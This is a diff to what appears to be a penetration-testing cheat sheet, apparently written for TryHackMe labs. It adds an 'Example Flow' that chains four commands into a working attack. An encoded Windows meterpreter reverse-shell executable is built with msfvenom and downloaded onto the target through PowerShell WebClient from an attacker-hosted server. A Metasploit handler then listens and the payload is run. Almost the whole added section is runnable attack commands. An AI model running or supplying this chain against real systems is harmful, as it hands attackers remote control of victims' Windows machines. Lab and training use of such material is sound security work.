@@ -293,6 +293,13 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -e x86/
 ### Hosting_Download
 `python -m SimpleHTTPServer 8080` : python module for basic http server on port 8080
 
+### Example Flow
+To get a meterpreter session on windows system.
+1. `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
+2. `powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`
+3. `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
+4. `Start-Process "shell-name.exe"`
+
 ---
 
 ## Automation
